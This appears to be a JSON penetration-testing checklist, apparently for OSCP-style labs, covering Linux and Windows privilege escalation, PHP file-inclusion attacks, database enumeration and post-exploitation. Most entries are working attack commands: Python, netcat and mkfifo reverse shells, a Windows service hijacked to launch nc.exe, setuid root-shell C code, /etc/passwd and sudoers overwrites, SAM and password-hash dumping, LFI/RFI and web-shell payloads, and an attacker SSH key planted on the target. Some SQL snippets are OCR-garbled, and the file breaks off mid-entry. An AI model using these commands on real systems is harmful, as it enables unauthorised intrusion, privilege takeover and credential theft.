[
  {
    "name": "EscalationLinux",
    "items": [
      {
        "entry": "Documents downloaded and ready:",
        "steps": [
          "Basic Linux Privilege Escalation.pdf",
          "A guide to Linux Privilege Escalation - payatu.pdf"
        ],
        "codeBlock": ""
      },
      {
        "entry": "Find linux distribution, version architecture:",
        "steps": [
          "cat /etc/issue; cat /etc/*-release; cat /etc/lsb-release; cat /etc/redhat-release;",
          "cat /proc/version; uname -a; uname -mrs; rpm -q kernel; dmesg | grep Linux; ls /boot | grep vmlinuz-; file /bin/ls; cat /etc/lsb-release"
        ],
        "codeBlock": ""
      },
      {
        "entry": "Run the built-in checklists and manual (https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation)",
        "steps": [
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Look for SUID and GUID bit set:",
        "steps": [
          "find / -perm -u=s -type f 2>/dev/null",
          "find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 6 -exec ls -ld {} \\; 2>/dev/null",
          "find / -perm -1000 -type d 2>/dev/null",
          "find / -perm -g=s -type f 2>/dev/null"
        ],
        "codeBlock": ""
      },
      {
        "entry": "Get a list of users from /etc/passwd, and check for weak passwords",
        "steps": [
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Try and run the local enumeration scripts",
        "steps": [
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Try escalating with Python:",
        "steps": [
          "sudo /usr/bin/python",
          "[CODE]",
          "Or a one liner: python -c 'import pty;pty.spawn(\"/bin/bash\")'"
        ],
        "codeBlock": "import os\r\nos.system('/bin/bash')"
      },
      {
        "entry": "Another Python escalation",
        "steps": [
          "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${target}\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
        ],
        "codeBlock": ""
      },
      {
        "entry": "Interactive Shell",
        "steps": [
          "/bin/sh -i",
          "exec \"/bin/sh\";",
          "perl -e 'exec \"/bin/sh\";"
        ],
        "codeBlock": ""
      },
      {
        "entry": "From within tcpdump:",
        "steps": [
          "echo $'id\\n/bin/netcat $ip 443 -e /bin/bash' > /tmp/.test",
          "chmod +x /tmp/.test",
          "sudo tcpdump -ln -I eth- -w /dev/null -W 1 -G 1 -z /tmp/.tst -Z root"
        ],
        "codeBlock": ""
      },
      {
        "entry": "Get list of sudo files",
        "steps": [
          "sudo -l",
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Things to look:",
        "steps": [
          "Miss-configured services (cronjobs)",
          "Incorrect file permissions (exportfs, sudo)",
          "Miss-configured environment ($PATH)",
          "Binary with SUID bit",
          "Software or OS with known vulnerabilities"
        ],
        "codeBlock": ""
      },
      {
        "entry": "SU sudo with no password",
        "steps": [
          "sudo su -",
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "What services are running as root?:",
        "steps": [
          "ps aux | grep root"
        ],
        "codeBlock": ""
      },
      {
        "entry": "Look for vulnerable/privileged components such as: mysql, sudo, udev, python",
        "steps": [
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Is /etc/exports is writable?",
        "steps": [
          "If /etc/exports is writable, you can add an NFS entry or change an existing entry by adding the no_root_squash flag to a root directory, put a binary with SUID bit on, and get root."
        ],
        "codeBlock": ""
      },
      {
        "entry": "The following command will list processes running by root, permissions and NFS exports",
        "steps": [
          "echo 'services running as root'; ps aux | grep root;  echo 'permissions';",
          "ps aux | awk '{print $11}'|xargs -r ls -la 2>/dev/null |awk '!x[$0]++'; echo 'nfs info';",
          "ls -la /etc/exports 2>/dev/null; cat /etc/exports 2>/dev/null"
        ],
        "codeBlock": ""
      },
      {
        "entry": "If Mysql is running as root try sys_exec():",
        "steps": [
          "sys_exec('usermod -a -G admin username')",
          "Also, check the MySQL checklist for step-by-step instructions."
        ],
        "codeBlock": ""
      },
      {
        "entry": "Environment variables:",
        "steps": [
          "cat /etc/profile; cat /etc/bashrc; cat ~/.bash_profile; cat ~/.bashrc; cat ~/.bash_logout; env; set"
        ],
        "codeBlock": ""
      },
      {
        "entry": "Find printers: lpstat -a",
        "steps": [
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Find apps installed:",
        "steps": [
          "ls -alh /usr/bin/; ls -alh /sbin/; dpkg -l; rpm -qa; ls -alh /var/cache/apt/archivesO; ls -alh /var/cache/yum/*;"
        ],
        "codeBlock": ""
      },
      {
        "entry": "Find writable configuration files:",
        "steps": [
          "find /etc/ -writable -type f 2>/dev/null"
        ],
        "codeBlock": ""
      },
      {
        "entry": "Grep hard coded passwords:",
        "steps": [
          "grep -i user [filename]",
          "grep -i pass [filename]",
          "grep -C 5 \"password\" [filename]",
          "find . -name \"*.php\" -print0 | xargs -0 grep -i -n \"var $password\""
        ],
        "codeBlock": ""
      },
      {
        "entry": "User bash history:",
        "steps": [
          "cat ~/.bash_history; cat ~/.nano_history; cat ~/.atftp_history; cat ~/.mysql_history; cat ~/.php_history"
        ],
        "codeBlock": ""
      },
      {
        "entry": "User mails:",
        "steps": [
          "cat ~/.bashrc; cat ~/.profile; cat /var/mail/root; cat /var/spool/mail/root"
        ],
        "codeBlock": ""
      },
      {
        "entry": "Find interesting binaries:",
        "steps": [
          "find / -name wget; find / -name nc*; find / -name netcat*; find / -name tftp*; find / -name ftp"
        ],
        "codeBlock": ""
      },
      {
        "entry": "Adding a binary to PATH, to hijack another SUID binary invokes it without the fully qualified path:",
        "steps": [
          "function /usr/bin/foo () { /usr/bin/echo \"It works\"; }",
          "export -f /usr/bin/foo",
          "/usr/bin/foo"
        ],
        "codeBlock": ""
      },
      {
        "entry": "If you can just change PATH, the following will add a poisoned ssh binary:",
        "steps": [
          "set PATH=\"/tmp:/usr/local/bin:/usr/bin:/bin\"",
          "echo \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.1 4444 >/tmp/f\" >> /tmp/ssh",
          "chmod +x ssh"
        ],
        "codeBlock": ""
      },
      {
        "entry": "Generating SUID C Shell for /bin/bash:",
        "steps": [
          ""
        ],
        "codeBlock": "int main(void)\r\n{ \r\n\\tsetresuid(0, 0, 0); \r\n\\tsystem(\"/bin/bash\"); \r\n}"
      },
      {
        "entry": "Without interactive shell:",
        "steps": [
          ""
        ],
        "codeBlock": "echo -e '#include <stdio.h>\\n#include <sys/types.h>\\n#include <unistd.h>\\n\\nint main(void){\\n\\tsetuid(0);\\n\\tsetgid(0);\\n\\tsystem(\"/bin/bash\");\\n}' > setuid.c"
      },
      {
        "entry": "If /etc/passwd has incorrect permissions:",
        "steps": [
          "You can root (echo 'root::0:0:root:/root:/bin/bash' > /etc/passwd; su)"
        ],
        "codeBlock": ""
      },
      {
        "entry": "Add user www-data to sudoers with no password:",
        "steps": [
          "echo 'chmod 777 /etc/sudoers && echo \"www-data ALL=NOPASSWD:ALL\" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update"
        ],
        "codeBlock": ""
      },
      {
        "entry": "If you can sudo chmod:",
        "steps": [
          "echo -e '#include <stdio.h>\\n#include <sys/types.h>\\n#include <unistd.h>\\n\\nint main(void){\\n\\tsetuid(0);\\nsetgid(0);\\nsystem(\"/bin/bash\");\\n}' > setuid.c",
          "sudo chown root:root /tmp/setuid",
          "sudo chmod 4777",
          "tmp/setuid",
          "/tmp/setuid"
        ],
        "codeBlock": ""
      },
      {
        "entry": "Wildcard injection if there is a cron with a wildcard",
        "steps": [
          "Wildcard injection if there is a cron with a wildcard in the command line, you can create a file, whose name will be passed as an argument to the cron task. e.g (*/1 *   * * *   root tar -zcf /var/backups/html.tgz /var/www/html/*)",
          "Linux Privilege Escalation by Exploiting Cronjobs.pdf"
        ],
        "codeBlock": ""
      },
      {
        "entry": "World readable/writable files:",
        "steps": [
          "echo \"world-writeable folders\"; find / -writable -type d 2>/dev/null; echo \"world-writeable folders\";",
          "find / -perm -222 -type d 2>/dev/null; echo \"world-writeable folders\"; find / -perm -o w -type d 2>/dev/null;",
          "echo \"world-executable folders\"; find / -perm -o x -type d 2>/dev/null; echo \"world-writeable & executable folders\";",
          "find / \\( -perm -o w -perm -o x \\) -type d 2>/dev/null;",
          "find / -xdev -type d \\( -perm -0002 -a ! -perm -1000 \\) -print",
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Ring0 kernel exploit for 2.3/2.4:",
        "steps": [
          "wget http://downloads.securityfocus.com/vulnerabilities/exploits/36038-6.c; gcc 36038-6.c -m32 -o ring0; ch",
          "mod +x ring0; ./ring0"
        ],
        "codeBlock": ""
      },
      {
        "entry": "Inspect web traffic:",
        "steps": [
          "tcpdump tcp port 80 -w output.pcap -i eth0"
        ],
        "codeBlock": ""
      },
      {
        "entry": "The following script runs exploit suggester and automatically downloads and executes suggested exploits:",
        "steps": [
          "wget https://raw.githubusercontent.com/codingo/OSCP-1/master/xploitdeli.py",
          "wget http://www.securitysift.com/download/linuxprivchecker.py (Scripts/Python)",
          "wget https://github.com/pentestmonkey/unix-privesc-check"
        ],
        "codeBlock": ""
      },
      {
        "entry": "Other scripts (These are already downloaded):",
        "steps": [
          "wget https://github.com/wwong99/pentest-notes/blob/master/scripts/xploit_installer.py",
          "wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh",
          "wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh",
          "wget https://raw.githubusercontent.com/PenturaLabs/Linux_Exploit_Suggester/master/Linux_Exploit_Suggester.pl"
        ],
        "codeBlock": ""
      }
    ]
  },
  {
    "name": "EscalationWindows",
    "items": [
      {
        "entry": "Information gathering:",
        "steps": [
          "# Basics",
          "systeminfo",
          "hostname",
          "wmic qfe get Caption,Description,HotFixID,InstalledOn",
          "",
          "# Who am I?",
          "whoami",
          "echo %username%",
          "",
          "# What users/localgroups are on the machine?",
          "net users",
          "net localgroups",
          "",
          "# More info about a specific user. Check if user has privileges.",
          "net user user1",
          "",
          "# View Domain Groups",
          "net group /domain",
          "",
          "# View Members of Domain Group",
          "net group /domain <Group Name>",
          "",
          "# Firewall",
          "netsh firewall show state",
          "netsh firewall show config",
          "",
          "# Network",
          "ipconfig /all",
          "route print",
          "arp -A",
          "",
          "# How well patched is the system?",
          "wmic qfe get Caption,Description,HotFixID,InstalledOn",
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Try dumping the SAM file",
        "steps": [
          "Win 7 and 2008 server:",
          "reg save hklm\\sam c:\\sam",
          "reg save hklm\\system c:\\system",
          "apt-get install samdump2",
          "samdump2 system sam",
          "Mimikatz: https://github.com/gentilkiwi/mimikatz/releases",
          "fgdump: https://github.com/interference-security/kali-windows-binaries/tree/master/fgdump",
          "hashdump: Built into meterpreter; extracts hashes from memory.",
          "SAM file can also be stored in a backup location: C:\\Windows\\Repair\\SAM"
        ],
        "codeBlock": ""
      },
      {
        "entry": "Check for weak permissions on processes running",
        "steps": [
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Try and run the local enumeration python script",
        "steps": [
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Other scripts (These are already downloaded):",
        "steps": [
          "Start HTTP server in 'Scripts/win'",
          "Powerless.bat: A Windows privilege escalation (enumeration) script designed with OSCP labs.",
          "Windows-Exploit-Suggester: This tool compares a targets patch levels against the Microsoft vulnerability database in order to detect potential missing patches on the target.",
          "SessionGopher: SessionGopher is a PowerShell tool that uses WMI to extract saved session information for remote access tools such as WinSCP, PuTTY, SuperPuTTY, FileZilla, and Microsoft Remote Desktop.",
          "JAWS: JAWS is PowerShell script designed to help penetration testers (and CTFers) quickly identify potential privilege escalation vectors on Windows systems.",
          "windows-privesc-check: Windows-privesc-check is standalone executable that runs on Windows systems.",
          "Sherlock: PowerShell script to quickly find missing software patches for local privilege escalation vulnerabilities.",
          "PowerUp: PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations."
        ],
        "codeBlock": "certutil.exe -urlcache -split -f \"http://$IP/Powerless.bat\" Powerless.bat\r\ncertutil.exe -urlcache -split -f \"http://$IP/windows-exploit-suggester.py\" windows-exploit-suggester.py\r\ncertutil.exe -urlcache -split -f \"http://$IP/SessionGopher.ps1\" SessionGopher.ps1\r\ncertutil.exe -urlcache -split -f \"http://$IP/jaws-enum.ps1\" jaws-enum.ps1\r\ncertutil.exe -urlcache -split -f \"http://$IP/windows_privesc_check.py\" windows_privesc_check.py\r\nhttps://github.com/pentestmonkey/windows-privesc-check\r\ncertutil.exe -urlcache -split -f \"http://$IP/Sherlock.ps1\" Sherlock.ps1\r\ncertutil.exe -urlcache -split -f \"http://$IP/PowerUp.ps1\" PowerUp.ps1"
      },
      {
        "entry": "Cleartext Passwords:",
        "steps": [
          "findstr /si password *.txt",
          "findstr /si password *.xml",
          "findstr /si password *.ini",
          "",
          "#Find all those strings in config files.",
          "dir /s *pass* == *cred* == *vnc* == *.config*",
          "",
          "# Find all passwords in all files.",
          "findstr /spin \"password\" *.*",
          "findstr /spin \"password\" *.*",
          "",
          "c:\\sysprep.inf",
          "c:\\sysprep\\sysprep.xml",
          "c:\\unattend.xml",
          "%WINDIR%\\Panther\\Unattend\\Unattended.xml",
          "%WINDIR%\\Panther\\Unattended.xml",
          "",
          "dir c:\\*vnc.ini /s /b",
          "dir c:\\*ultravnc.ini /s /b ",
          "dir c:\\ /s /b | findstr /si *vnc.ini",
          "",
          "# VNC",
          "reg query \"HKCU\\Software\\ORL\\WinVNC3\\Password\"",
          "",
          "# Windows autologin",
          "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\"",
          "",
          "# SNMP Paramters",
          "reg query \"HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP\"",
          "",
          "# Putty",
          "reg query \"HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\"",
          "",
          "# Search for password in registry",
          "reg query HKLM /f password /t REG_SZ /s",
          "reg query HKCU /f password /t REG_SZ /s"
        ],
        "codeBlock": ""
      },
      {
        "entry": "Change the upnp service binary (XP):",
        "steps": [
          "sc config upnphost binpath= \"C:\\Inetpub\\nc.exe 192.168.1.101 6666 -e c:\\Windows\\system32\\cmd.exe\"",
          "sc config upnphost obj= \".\\LocalSystem\" password= \"\"",
          "sc config upnphost depend= \"\"",
          "",
          "https://www.fuzzysecurity.com/tutorials/16.html",
          "Windows Enumeration_fuzzy.pdf"
        ],
        "codeBlock": ""
      },
      {
        "entry": "Weak Service Permissions:",
        "steps": [
          "wmic service list brief",
          "",
          "Once code is ran, you can process them one by one with the cacls or icacls command:",
          "icacls \"C:\\path\\to\\file.exe\"",
          "",
          "What we are interested in is binaries that have been installed by the user. In the output you want to look for BUILTIN\\Users:(F). Or where your user/usergroup has (F) or (C) rights.",
          "",
          "That means your user has write access. So you can just rename the .exe file and then add your own malicious binary. And then restart the program and your binary will be executed instead. This can be a simple getsuid program or a reverse shell that you create with msfvenom.",
          "wmic service NAMEOFSERVICE call startservice",
          "net stop [service name] && net start [service name]",
          "Document downloaded: Weak service permissions.pdf"
        ],
        "codeBlock": "for /f \"tokens=2 delims='='\" %a in ('wmic service list full^|find /i \"pathname\"^|find /i /v \"system32\"') do @echo %a >> c:\\windows\\temp\\permissions.txt\r\n\r\nfor /f eol^=^\"^ delims^=^\" %a in (c:\\windows\\temp\\permissions.txt) do cmd.exe /c icacls \"%a\"\r\n\r\nsc query state= all | findstr \"SERVICE_NAME:\" >> Servicenames.txt\r\n\r\nFOR /F %i in (Servicenames.txt) DO echo %i\r\ntype Servicenames.txt\r\nFOR /F \"tokens=2 delims= \" %i in (Servicenames.txt) DO @echo %i >> services.txt\r\nFOR /F %i in (services.txt) DO @sc qc %i | findstr \"BINARY_PATH_NAME\" >> path.txt"
      },
      {
        "entry": "Code for creating a new local admin:",
        "steps": [
          "We then compile it with mingw like this:",
          "i686-w64-mingw32-gcc windows-exp.c -lws2_32 -o exp.exe",
          "",
          "Or build it on a Windows box like a real man."
        ],
        "codeBlock": "#include <stdlib.h>\r\nint main ()\r\n{\r\n   int i;\r\n   i = system(\"net localgroup administrators samual /add\");\r\n   return 0;\r\n}"
      },
      {
        "entry": "Unquoted Service Paths:",
        "steps": [
          "Find services w/ unquoted paths, if the path contains a space and is not quoted, the service is vulnerable.",
          "If the path to the binary is: c:\\Program Files\\something\\winamp.exe",
          "We can place a binary like this: c:\\program.exe",
          "When the program is restarted it will execute the binary program.exe, which we of course control. We can do this in any directory that has a space in its name. Not only program files.",
          "There is also a metasploit module for this is: exploit/windows/local/trusted_service_path",
          "Document downloaded: Unquoted Service Paths.pdf"
        ],
        "codeBlock": "# Using WMIC\r\nwmic service get name,displayname,pathname,startmode |findstr /i \"auto\" |findstr /i /v \"c:\\windows\\\\\" |findstr /i /v \"\"\"\r\n\r\n# Using sc\r\nsc query\r\nsc qc service name\r\n\r\n# Look for Binary_path_name and see if it is unquoted."
      },
      {
        "entry": "Always Install Elevated:",
        "steps": [
          "Check to see if there are services that you can run with elevated privilages.",
          "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated",
          "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated",
          "",
          "Document downloaded: Always Install Elevated.pdf"
        ],
        "codeBlock": ""
      },
      {
        "entry": "Group Policy Preference:",
        "steps": [
          "If the machine belongs to a domain and your user has access to System Volume Information there might be some sensitive files there.",
          "First we need to map/mount that drive. In order to do that we need to know the IP-address of the domain controller. We can just look in the environment-variables.",
          "If we find the file with a password in it, we can decrypt it like this in Kali: gpp-decrypt encryptedpassword"
        ],
        "codeBlock": "# Output environment-variables\r\nset\r\n\r\n# Look for the following:\r\nLOGONSERVER=\\\\NAMEOFSERVER\r\nUSERDNSDOMAIN=WHATEVER.LOCAL\r\n\r\n# Look up ip-addres\r\nnslookup nameofserver.whatever.local\r\n\r\n# It will output something like this\r\nAddress:  192.168.1.101\r\n\r\n# Now we mount it\r\nnet use z: \\\\192.168.1.101\\SYSVOL\r\n\r\n# And enter it\r\nz:\r\n\r\n# Now we search for the groups.xml file\r\ndir Groups.xml /s"
      }
    ]
  },
  {
    "name": "FileTransfer",
    "items": [
      {
        "entry": "Some options:",
        "steps": [
          "python -m SimpleHTTPServer 80",
          "python3 -m http.server 80",
          "python -m pyftpdlib -p 21",
          "python3 -m pyftpdlib -p 21",
          "meterpreter > upload some_file c:\\",
          "(Start TFTP server) (put stuff in /srv/tftp) atftpd --daemon --port 69 /tftp; /etc/init.d/atftpd restart"
        ],
        "codeBlock": ""
      }
    ]
  },
  {
    "name": "MySql",
    "items": [
      {
        "entry": "Check for default usernames and passwords.",
        "steps": [
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Check for same username and password.",
        "steps": [
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Check for blank password.",
        "steps": [
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Run bruteforce",
        "steps": [
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Standard enumeration commands:",
        "steps": [
          ""
        ],
        "codeBlock": "SELECT @@version; /* DB version */ \r\nSELECT @@hostname; /* Hostname & IP */\r\nSELECT database(); /* Current DB */\r\nSELECT distinct (db) FROl1 mjsql.db; /* List DBs */\r\nSELECT user(); /* Current user */\r\nSELECT user FROM mJsql.user; /* List users */ \r\nSELECT host,user,password FROM mJsql.user; /* List password hashes */"
      },
      {
        "entry": "List all tables and columns:",
        "steps": [
          ""
        ],
        "codeBlock": "SELECT table schema, table name, column_ name FROM\r\n  information scherna.columns WHERE\r\n  table schema != 'rnysql' AND table schema != 'information schema'"
      },
      {
        "entry": "Execute OS commands:",
        "steps": [
          "osql -S ip, port -U sa -P pwd -Q \"exec xp cmdshell 'net user /add user pass'\""
        ],
        "codeBlock": ""
      },
      {
        "entry": "MySQL Root to System Root w/ lib_mysqludf_sys",
        "steps": [
          "Windows: Windows_lib_mysqludf_sys.sql",
          "Linux : Linux_lib_mysqludf_sys.sql"
        ],
        "codeBlock": ""
      }
    ]
  },
  {
    "name": "NetworkScan",
    "items": [
      {
        "entry": "Initial Scan",
        "steps": [
          "Start a version scan in Nmap in Zenmap (nmap -sV 10.0.0.0-100) be sure to save the results"
        ],
        "codeBlock": "nmap -sV 10.0.0.0-100"
      },
      {
        "entry": "Use Masscan, and Sparta to get a second scan",
        "steps": [
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Use Nmap, and Sparta and do a slow, stealthly thrid scan, and be sure to get every port.",
        "steps": [
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Find all HTTP servers and run the big 4 scanners on them (Nikto, Nessus, Nexpose, OpenVAS)",
        "steps": [
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Do a full TCP/UDP slow and silent scan on each machine. (should take about a week)'",
        "steps": [
          ""
        ],
        "codeBlock": ""
      }
    ]
  },
  {
    "name": "NotableExploits",
    "items": [
      {
        "entry": "Linux Kernel <= 2.6.36-rc8",
        "steps": [
          "CVE-2010-3904 - Linux RDS Exploit - Linux Kernel <= 2.6.36-rc8: https://www.exploit-db.com/exploits/15285/"
        ],
        "codeBlock": ""
      },
      {
        "entry": "Linux Kernel <= 2.6.37",
        "steps": [
          "Linux Kernel <= 2.6.37 'Full-Nelson.c': https://www.exploit-db.com/exploits/15704/"
        ],
        "codeBlock": ""
      },
      {
        "entry": "Linux Kernel 2.6.39 < 3.2.2",
        "steps": [
          "CVE-2012-0056 - Mempodipper - Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64)",
          "https://git.zx2c4.com/CVE-2012-0056/about"
        ],
        "codeBlock": ""
      },
      {
        "entry": "Linux kernel < 3.2.2",
        "steps": [
          "Linux CVE 2012-0056: wget -O exploit.c <http://www.exploit-db.com/download/18411"
        ],
        "codeBlock": ""
      },
      {
        "entry": "Linux Kernel <= 3.19.0-73.8",
        "steps": [
          "CVE-2016-5195 - Dirty Cow - Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8: https://dirtycow.ninja"
        ],
        "codeBlock": ""
      },
      {
        "entry": "Linux 2.6.32",
        "steps": [
          "Linux 2.6.32: https://www.exploit-db.com/exploits/15285"
        ],
        "codeBlock": ""
      }
    ]
  },
  {
    "name": "Oracle DB",
    "items": [
      {
        "entry": "Check for default usernames and passwords",
        "steps": [
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Check for same username and password",
        "steps": [
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Check for blank password",
        "steps": [
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Run bruteforce",
        "steps": [
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Standard enumeration commands:",
        "steps": [
          ""
        ],
        "codeBlock": "SELECT * FROM v$version; /* DB version */' + \\\r\nSELECT version FROM v$instance; /* DB version */' + \\\r\nSELECT instance name FROM v$instance; /*   */\r\nSELECT name FROM $database; /* Current DB */\r\nSELECT DISTINCT owner FROM all tables; /* List DBs */\r\nSELECT user FROM dual; /* Current user */\r\nSELECT username FROM all users ORDER BY username; /* List users */\r\nSELECT column name FROM all tab columns; /* List columns */\r\nSELECT name, -password, astatus FROt1 SJS.user$; /* List password hashes */"
      }
    ]
  },
  {
    "name": "PHP",
    "items": [
      {
        "entry": "Downloaded file:",
        "steps": [
          "PHP File Upload Restrictions Bypass.pdf",
          "From Local File Inclusion to Remote Code Execution - Part 1.pdf",
          "From Local File Inclusion to Remote Code Execution - Part 2.pdf"
        ],
        "codeBlock": ""
      },
      {
        "entry": "Looking for LFI/RFI:",
        "steps": [
          "/script.php?page=../../../../etc/passwd",
          "/script.php?page=../../../../etc/passwd%00 <-- Might need to use NULL ending",
          "php?page=php://filter/convert.base64-encode/resource=/etc/passwd%2500 <-- Different kind of NULL to try",
          "php?page=php://filter/read=convert.base64-encode/resource=config",
          "/section.php?page=php://filter/convert.base64-encode/resource=section.php%00",
          "php?page=expect://ls",
          "php?page=php://input&cmd=ls",
          "index.php?file=..%2F..%2F..%2F..%2F..%2Fetc/passwd",
          "index.php?file=....//....//....//....//....//etc/passwd",
          "../../../etc/passwd/./././././<...>/././.php but the filename will be longer than 4096 bytes so the overlong part will be dropped",
          "index.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA2fPg%3d%3d",
          "http://php.net/manual/en/wrappers.php.php"
        ],
        "codeBlock": ""
      },
      {
        "entry": "What you can do with LFI:",
        "steps": [
          "Get source files including the config.php file.",
          "index.php?file=data:text/plain;,<?php echo shell_exec($_GET['cmd']);?>"
        ],
        "codeBlock": ""
      },
      {
        "entry": "What you can do with RFI:",
        "steps": [
          "Can get a shell: php?page=http://ATTACHER_IP:8000/shell.php%00",
          "php://filter/resource=http://www.example.com"
        ],
        "codeBlock": ""
      },
      {
        "entry": "PHP ZIP Wrapper LFI:",
        "steps": [
          "Create a PHP reverse shell",
          "Compress to a .zip file",
          "Upload the compressed shell payload to the server",
          "Use the zip wrapper to extract the payload using: php?page=zip://path/to/file.zip%23shell",
          "The above will extract the zip file to shell, if the server does not append .php rename it to shell.php instead"
        ],
        "codeBlock": ""
      }
    ]
  },
  {
    "name": "Postgres Server",
    "items": [
      {
        "entry": "Check for default usernames and passwords",
        "steps": [
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Check for same username and password",
        "steps": [
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Check for blank password",
        "steps": [
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Run bruteforce",
        "steps": [
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Standard enumeration commands:",
        "steps": [
          ""
        ],
        "codeBlock": "'SELECT version();\r\nSELECT inet server_addr();\r\nSELECT current database();\r\nSELECT datname FROM pg database;\r\nSELECT user;\r\nSELECT username FROM pg_user;\r\nSELECT username,passwd FROM pg shadow;"
      },
      {
        "entry": "List Tables:",
        "steps": [
          ""
        ],
        "codeBlock": "SELECT c.relname FROM pg_catalog.pg_class c\r\n  LEFT JOIN pg catalog.pg namespace n ON n.old = c.relnamespace \r\n  WHERE c.relkind IN ( 'r','') AND n.nspnarne NOT IN ('pg catalog', 'pg toast')\r\n  AND pg catalog.pg table is visible(c.oid)"
      }
    ]
  },
  {
    "name": "RootedLinux",
    "items": [
      {
        "entry": "Grab the shadow file for cracking later.",
        "steps": [
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Grab the proof.txt file in the /root dir.",
        "steps": [
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Check network interfaces for what networks it is connected to:",
        "steps": [
          "/sbin/ifconfig -a; cat /etc/network/interfaces; cat /etc/sysconfig/network; cat /etc/resolv.conf;",
          "/sbin/ifconfig -a; cat /etc/network/interfaces; cat /etc/sysconfig/network; cat /etc/resolv.conf;"
        ],
        "codeBlock": ""
      },
      {
        "entry": "Remember you might need to use this to pivot.",
        "steps": [
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Run sniffer to see what operations are going on.",
        "steps": [
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Add public key to authorized keys:",
        "steps": [
          "echo $(wget https://ATTACKER_IP/.ssh/id_rsa.pub) >> ~/.ssh/authorized_keys"
        ],
        "codeBlock": ""
      },
      {
        "entry": "Use netstat to find other machines connected: netstat -ano",
        "steps": [
          ""
        ],
        "codeBlock": ""
      }
    ]
  },
  {
    "name": "RootedWindows",
    "items": [
      {
        "entry": "Grab hashes for cracking later:",
        "steps": [
          "Victim recieves file: nc -l -p 1234 > fgdump.exe",
          "Send fgdump: nc -w 3 [IP] 1234 < fgdump.exe"
        ],
        "codeBlock": ""
      },
      {
        "entry": "Use wce.exe -w to extract any passwords in memory.",
        "steps": [
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Grab the C:\\Users\\Administrator\\Desktop\\proof.txt file in the desktop dir.",
        "steps": [
          "",
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Check network interfaces for what networks it is connected to.",
        "steps": [
          "",
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Remember you might need to use this to pivot.",
        "steps": [
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Run sniffer to see what operations are going on.",
        "steps": [
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Run Get-GPPPassword from Powersploit to get group.xml encrypted passwords.",
        "steps": [
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Use netstat to find other machines connected: netstat -ano",
        "steps": [
          ""
        ],
        "codeBlock": ""
      }
    ]
  },
  {
    "name": "SMB",
    "items": [
      {
        "entry": "Enumerate",
        "steps": [
          "enum4linux -a  ${target}",
          "NmapSmbEnum custom command"
        ],
        "codeBlock": ""
      },
      {
        "entry": "Null session check",
        "steps": [
          "Null session check (smbclient -I  ${target}  -L PC_NAME -N -U)",
          "Investigate shares (smbclient //PC_NAME/SHARE -I  ${target} )",
          "Check for NULL user RPC commands (rpcclient -U \"\"  ${target} )"
        ],
        "codeBlock": ""
      },
      {
        "entry": "NetBIOS over TCP/IP client used to lookup NetBIOS names",
        "steps": [
          "nmblookup -A  ${target} ",
          "nbtscan -r 10.11.1.0/24"
        ],
        "codeBlock": ""
      },
      {
        "entry": "Check for MS08-067",
        "steps": [
          "nmap -v -p 139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=${target} "
        ],
        "codeBlock": ""
      },
      {
        "entry": "Vulnerability Scanning",
        "steps": [
          "NmapSmbVuln custom command"
        ],
        "codeBlock": ""
      },
      {
        "entry": "Bruteforce",
        "steps": [
